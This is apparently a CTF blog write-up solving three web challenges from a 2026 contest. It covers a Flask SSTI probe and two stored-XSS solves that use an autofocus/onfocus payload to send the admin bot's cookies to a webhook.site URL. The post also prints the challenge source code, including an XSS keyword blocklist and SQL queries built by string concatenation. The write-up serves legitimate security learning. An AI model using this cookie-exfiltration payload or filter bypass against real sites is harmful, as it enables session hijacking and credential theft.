---
layout: post
title:  "Web Challenges"
date:   2026-06-03 05:46:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /BYU-CTF-2026-web/
---
* TOC
{:toc}
{% raw %}
## My Cat Website

**Category**: Web

**Author**: overllama

**Description**: kittiessss [https://cats.chals.cyberjousting.com](https://cats.chals.cyberjousting.com)

I download the challenge files:
```shell
unzip dist.zip  
Archive:  dist.zip  
  inflating: app.py  
  inflating: templates/cat_form.html  
  inflating: templates/cat.html
```

Contents of `app.py`:
```python
from flask import Flask, request, jsonify, render_template
import random

# TODO: figure out if I want them to have the flag or not
give_flag = False

class Cat:
    is_happy = False
    
    def to_dict(self):
        return {
            "name": self.name,
            "age": self.age,
            "color": self.color,
            "is_happy": self.is_happy
        }

# https://www.asciiart.eu/animals/cats
cat_ascii = [
    """    |\\__/,|   (`\\
  _.|o o  |_   ) )
-(((---(((--------
""",
"""      |\\      _,,,---,,_
ZZZzz /,`.-'`'    -.  ;-;;,_
     |,4-  ) )-,_. ,\\ (  `'-'
    '---''(_/--'  `-'\\_) 
""",
""" _._     _,-'""`-._
(,-.`._,'(       |\\`-/|
    `-.-' \\ )-`( , o o)
          `-    \\`_`"'-
""",
"""           __..--''``---....___   _..._    __
 /// //_.-'    .-/";  `        ``<._  ``.''_ `. / // /
///_.-' _..--.'_    \\                    `( ) ) // //
/ (_..-' // (< _     ;_..__               ; `' / ///
 / // // //  `-._,_)' // / ``--...____..-' /// / //
""",
""" |\\__/,|   (`\\
 |_ _  |.--.) )
 ( T   )     /
(((^_(((/(((_/
"""
]

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("cat_form.html")

@app.route("/cat", methods=["POST"])
def create_cat():
    """
    Expects JSON payload like:
    {
        "name": "Whiskers",
        "age": 3,
        "color": "tabby",
        "is_happy": true
    }
    """
    if not request.is_json:
        return jsonify({"error": "Request must be JSON"}), 400

    data = request.get_json()
    print(data)

    # Basic validation
    required_fields = ["name", "age", "color"]
    for field in required_fields:
        if field not in data:
            return jsonify({"error": f"Missing required field: {field}"}), 400

    # make the cat
    cat = Cat()
    merge(data, cat)
    cat = cat.to_dict()

    if give_flag and cat.get("is_happy"):
        return render_template("flag.html", cat=cat, cat_ascii=cat_ascii)

    print(cat)
    return render_template("cat.html", ascii_art=random.choice(cat_ascii), **cat)


if __name__ == "__main__":
    app.run(debug=True)
```

`Flask` makes me think of SSTI right away!

I send this request to the site:
```http
POST /cat HTTP/1.1
Host: cats.chals.cyberjousting.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://cats.chals.cyberjousting.com/
Content-Type: application/json
Content-Length: 44
Origin: https://cats.chals.cyberjousting.com
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"name":"{{7*7}}","age":100,"color":"green"}
```

Response:
```shell
HTTP/2 200 OK
Alt-Svc: h3=":443"; ma=2592000
Content-Type: text/html; charset=utf-8
Date: Sat, 30 May 2026 05:08:34 GMT
Server: Werkzeug/3.1.8 Python/3.11.15
Via: 1.1 Caddy
Content-Length: 28

byuctf{y0u_m4d3_k1tty_h4ppy}
```

`byuctf{y0u_m4d3_k1tty_h4ppy}`

___

## on point

**Category**: Web

**Author**: The Camel

**Description**: The last XSS challenge was too easy. And I hate you. So I tried to think of every possible JS function that could possible be used to XSS my website. I will give you source code though because I'm not a monster. NOTE: You can report suspicious posts to the admin below.
[https://admin.chals.cyberjousting.com](https://admin.chals.cyberjousting.com)
[https://onpoint.chals.cyberjousting.com](https://onpoint.chals.cyberjousting.com)

I get the challenge files `app.py` and `bot.js`. Contents of `app.py`:
```python
# imports
from flask import Flask, render_template, session, request, redirect, make_response
import secrets
import sqlite3
import re

# filter out XSS!
# blocks the most common event handlers and exfiltration primitives
_BLOCKED = [
    "script", "fetch", "xmlhttprequest",
    "onload", "onerror", "ontoggle", "onmouseover", "onmouseenter",
    "onmouseleave", "onmouseout", "onmousedown", "onmouseup", "ondblclick",
    "onclick", "onscroll", "onwheel", "onresize", "onkeydown", "onkeyup",
    "onkeypress", "onsubmit", "onchange", "oninput", "onblur",
    "oncontextmenu", "onpointerover", "onpointerdown", "onpointerup",
    "onpageshow", "onpagehide", "onhashchange", "onanimation", "ontransition",
]

def filter_str(s):
    for keyword in _BLOCKED:
        if re.search(keyword, s, re.IGNORECASE):
            return True
    return False


# initialize database
conn = sqlite3.connect('local.db')
print("Opened database successfully")

conn.execute('CREATE TABLE if not exists posts (postID TEXT, session TEXT, content TEXT, comments TEXT)')
print("Posts table created successfully")

conn.close()


# initialize flask
app = Flask(__name__)
app.secret_key = open("secret_key.txt", "r").read()
app.config["SESSION_COOKIE_HTTPONLY"] = False


# home page
@app.route('/', methods=['GET'])
def home():

    # if you're a new tester, we'll make you a brand new id!
    if 'id' not in session:
        session['id'] = secrets.token_hex(32)

    # get all posts
    posts = []
    con = sqlite3.connect("local.db")
    con.row_factory = sqlite3.Row

    cur = con.cursor()
    cur.execute(f"SELECT * FROM posts WHERE session = '{session['id']}'")
    rows = cur.fetchall()

    for row in rows:
        posts.append({
            'id': row['postID'],
            'content': row['content'],
            'comments': row['comments'].split("|")
        })

    # actual HTML for index.html
    index = """
<!DOCTYPE html>

<head>
    <title>FaceTagramTokBook but the second one where it's way harder</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body>
    <div class="container">
        <div id="header">
            <h1>🔒 FaceTagramTokBook but the second one where it's way harder</h1>
            <p class="tagline">The most secure social network ever built</p>
        </div>

        <div id="links">
            <a href="/new" class="btn">✍️ Write a new post</a>
            <a href="https://www.youtube.com/watch?v=HUnqE_Tnkhg" class="btn btn-secondary">View your friends!</a>
        </div>

        <div id="title"><h2>View all your posts</h2></div>"""

    for post in posts:
        index += """
        <div class="post-container">
            <div class="post">"""+post["content"]+"""</div>
            <div class="small">Post ID: <a href="/getpost?id="""+post["id"]+"""" class="post-link">"""+post["id"]+"""</a></div>
            <div id="comments">
                <div class="comments-header">💬 Comments</div>"""

        for comment in post["comments"]:
            index += """<div class="comment">"""+comment+"""</div>"""

        index += """
                <div class="comment add-comment-box">
                    <form action="/addComment" method="post">
                        <h3>Add a comment for the world:</h3>
                        <input name="comment" type="text" placeholder="Share your thoughts..." class="comment-input">
                        <input name="postID" type="hidden" value=\""""+post['id']+"""\">
                        <input type="submit" value="Post Comment" class="btn btn-comment">
                    </form>
                </div>
            </div>
        </div>"""
    index += """
    </div>
</body>

<style>
 ... etc ...
</style>"""
    resp = make_response(index)
    resp.headers['Content-Security-Policy'] = "script-src 'unsafe-inline'; connect-src 'none'; img-src 'none'; object-src 'none'"
    return resp


# form to add a new post
@app.route('/new', methods=['GET'])
def new():
    return render_template("new.html")


@app.route('/getpost', methods=['GET'])
def getpost():
    # get variables
    postid = request.args["id"]

    # make sure it's hex
    VALID_CHARS = "0123456789abcdef"
    for letter in postid:
        if letter not in VALID_CHARS:
            return redirect('error')

    # try to get post
    con = sqlite3.connect("local.db")
    con.row_factory = sqlite3.Row

    cur = con.cursor()
    cur.execute(f"SELECT * FROM posts WHERE postID = '{postid}' LIMIT 1")
    rows = cur.fetchall()

    # make sure post exists
    if len(rows) == 0:
        return redirect('/error')

    for row in rows:
        content = row['content']
        comments = row['comments'].split("|")

    content = """
<!DOCTYPE html>

<head>
    <title>FaceTagramTokBook but the second one where it's way harder</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body>
    <div class="container">
        <div id="header">
            <h1>🔒 FaceTagramTokBook but the second one where it's way harder/h1>
            <p class="tagline">The most secure social network ever built</p>
        </div>

        <div id="links">
            <a href="/" class="btn">🏠 Back to home</a>
        </div>

        <div id="title"><h2>Post Details</h2></div>
        <div class="post-container">
            <div class="post">"""+content+"""</div>
            <div class="small">Post ID: """+str(postid)+"""</div>
            <div id="comments">
                <div class="comments-header">💬 Comments</div>"""

    for comment in comments:
        content += """<div class="comment">"""+comment+"""</div>"""

    content += """
            </div>
        </div>
    </div>
</body>

<style>
 ... etc ...
</style>"""

    resp = make_response(content)
    resp.headers['Content-Security-Policy'] = "script-src 'unsafe-inline'; connect-src 'none'; img-src 'none'; object-src 'none'"
    return resp


# actually adds a new post
@app.route('/add', methods=['POST'])
def add():
    # get variables
    content = request.form['content']

    if filter_str(content):
        return redirect('error')

    if ("'" in content):
        return redirect('error')

    # add new post
    with sqlite3.connect("local.db") as con:
        cur = con.cursor()
        id = secrets.token_hex(24)
        cur.execute(f"INSERT INTO posts (postID, session, content, comments) VALUES ('{id}', '{session['id']}', '{content}', 'Test comment!')")
        con.commit()

    return redirect('/')


# adds a comment to a post
@app.route('/addComment', methods=['POST'])
def addComment():
    # get variables
    comment = request.form['comment']
    id = request.form['postID']

    if filter_str(comment):
        return redirect('error')

    if ("'" in comment) or ('|' in comment):
        return redirect('error')

    # add comment
    con = sqlite3.connect("local.db")
    con.row_factory = sqlite3.Row

    cur = con.cursor()
    cur.execute(f"SELECT comments FROM posts WHERE postID = '{id}'")
    rows = cur.fetchall()

    # make sure post exists!
    if len(rows) == 0:
        return redirect('/error')

    finalComment = ""
    for row in rows:
        finalComment = row['comments']+"|"+comment

    cur.execute(f"UPDATE posts SET comments = '{finalComment}' WHERE postID = '{id}'")
    con.commit()

    return redirect('/')


# generic error form
@app.route('/error', methods=['GET'])
def error():
    return render_template("error.html")


# start application
if __name__ == "__main__":
        app.run(host='0.0.0.0', port=5000, threaded=True)
```

Contents of `bot.js`:
```javascript
var express = require("express");
var bodyParser = require("body-parser");
var puppeteer = require("puppeteer");
var app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

// endpoint to submit links to
app.post("/report", async function (req, res) {
    var url = req.body.url;
    var browser;
    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ["--no-sandbox", "--disable-setuid-sandbox"],
        });
        var page = await browser.newPage();
        await page.setCookie({
            name: "flag",
            value: "REDACTED",
            domain: "something",
            path: "/",
        });
        console.log("Visiting " + url);
        await page.goto(url, { waitUntil: "networkidle0", timeout: 10000 });
        await new Promise((r) => setTimeout(r, 3000));
    } catch (e) {
        console.log("Error visiting: " + e.message);
    } finally {
        if (browser) await browser.close();
    }
    res.sendFile(__dirname + "/public/response.html");
});

// main page to submit link
app.get("/", function (req, res) {
    res.sendFile(__dirname + "/public/index.html");
});

// start app
app.listen(1337, () => {
    console.log("Running on 1337");
});
```

The app uses a blacklist:
```python
_BLOCKED = [
    "script", "fetch", "xmlhttprequest",
    "onload", "onerror", "ontoggle", "onmouseover", "onmouseenter",
    "onmouseleave", "onmouseout", "onmousedown", "onmouseup", "ondblclick",
    "onclick", "onscroll", "onwheel", "onresize", "onkeydown", "onkeyup",
    "onkeypress", "onsubmit", "onchange", "oninput", "onblur",
    "oncontextmenu", "onpointerover", "onpointerdown", "onpointerup",
    "onpageshow", "onpagehide", "onhashchange", "onanimation", "ontransition",
]
```

The `onfocus` event handler is not blocked here. By using an `autofocus` attribute the event triggers automatically when the page loads, allowing JS execution without user interaction! 

On `https://onpoint.chals.cyberjousting.com/new` I create a post containing this:
```html
<input autofocus onfocus="window.location=`https://webhook.site/a87f1f57-2298-44dc-bbd4-8862e55acd6a/?c=${document.cookie}`">
```

Then I get the link to the post at `https://onpoint.chals.cyberjousting.com/getpost?id=2b03a5acfb5e2e008cc7c2e7e80762b1c0c56bec9c710354`.

On `https://admin.chals.cyberjousting.com/` I submit the link to the malicious post and back on [https://webhook.site/](https://webhook.site/) I get the link: 
```shell
https://webhook.site/a87f1f57-2298-44dc-bbd4-8862e55acd6a/?c=flag=byuctf{I_w4s_sur3_th1s_0ne_w4a_b3tt3r...}
```

`byuctf{I_w4s_sur3_th1s_0ne_w4a_b3tt3r...}`

___

## baby

**Category**: Web

**Author**: The Camel

**Description**: I wrote a XSS challenge to show you what an actual XSS attack looks like. I'm sure you can figure it out. Hopefully you can do it blind like in real life. [https://baby.chals.cyberjousting.com](https://baby.chals.cyberjousting.com)
I go to the site at `https://baby.chals.cyberjousting.com/`:

![Alt text](/images/byuctf2026web1.png)

I go to `https://baby.chals.cyberjousting.com/submit` to submit a ticket. I used the same payload I used in the `on point` challenge:
```html
<input autofocus onfocus="window.location=`https://webhook.site/a87f1f57-2298-44dc-bbd4-8862e55acd6a/?c=${document.cookie}`">
```

![Alt text](/images/byuctf2026web2.png)

I submit the ticket and receive my webhook link:
```shell
https://webhook.site/a87f1f57-2298-44dc-bbd4-8862e55acd6a/?c=admin_pass=super_secret_admin_password_999_lol
```

I get the flag on `https://baby.chals.cyberjousting.com/tickets` by adding the cookie `admin_pass=super_secret_admin_password_999_lol`:

![Alt text](/images/byuctf2026web3.png)
{% endraw %}
`byuctf{s33_1t5_3asy!}`
